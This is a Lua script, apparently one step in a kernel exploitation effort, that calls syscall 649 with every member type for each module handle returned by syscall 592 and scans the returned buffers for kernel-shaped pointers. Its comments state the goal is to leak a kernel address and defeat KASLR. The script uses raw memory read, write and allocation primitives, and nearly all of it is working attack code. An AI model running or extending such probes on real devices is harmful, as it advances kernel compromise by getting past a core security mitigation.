-- CRASH_CLASS: LOW
-- PROBE 579a: every member type of the module-member query, hunting a kernel pointer
--
-- Context: sys 649 returns userland addresses for member types 1-4, 7 and 8.
-- Types 5, 6 and 9+ were never measured. A member type that hands back a kernel
-- pointer would end the KASLR wall, so this walks the full type range for each
-- module handle that 592 reports.

print("=== PROBE 579a: SYS 649 MEMBER TYPES ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function sgn(v)
    local l = to_num(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function U(a)
    a = to_num(a)
    return uint64(string.format("0x%08X%08X", math.floor(a / 4294967296), a % 4294967296))
end
local Z = uint64(0)
local function rd(a) return to_num(memory.read_dword(a)) end
local function wd(a, v) memory.write_dword(a, v) end

local q = make_syscall(649)
local out = to_num(memory.alloc(0x400))
local list = to_num(memory.alloc(0x400))
local cnt = to_num(memory.alloc(8))

local r = sgn(make_syscall(592)(U(list), U(0x100), U(cnt), Z, Z, Z))
print(string.format("[0] handles rv=%d count=%d", r, rd(cnt)))
local n = rd(cnt)
if n > 60 then n = 60 end

local hits, kern = 0, 0
for h = 0, n - 1 do
    local handle = rd(list + h * 4)
    for mt = 0, 0x14 do
        for i = 0, 0x3F do wd(out + i * 4, 0) end
        local ok, rv = pcall(function()
            return sgn(q(U(out), U(handle), U(mt), U(0x100), Z, Z))
        end)
        if ok and rv == 0 then
            local nz, first = 0, -1
            local fh = 0
            for i = 0, 0x3F do
                local v = rd(out + i * 4)
                if v ~= 0 then
                    nz = nz + 1
                    if first < 0 then first = i * 4 end
                    if v >= 0xFFFF8000 then fh = fh + 1 end
                end
            end
            local second = rd(out + 4)
            if second >= 0xFFFF8000 then fh = fh + 1 end
            hits = hits + 1
            kern = kern + fh
            print(string.format("[H%02X] type=%d nz=%d first=%d hi=%08X lo=%08X kernhi=%d",
                h, mt, nz, first, rd(out + 4), rd(out), fh))
        end
    end
end
print(string.format("[Z] zero-returns=%d kernel-shaped-hi=%d alive=%s", hits, kern,
    tostring(pcall(function() return make_syscall(20)() end))))
print("=== 579a DONE ===")
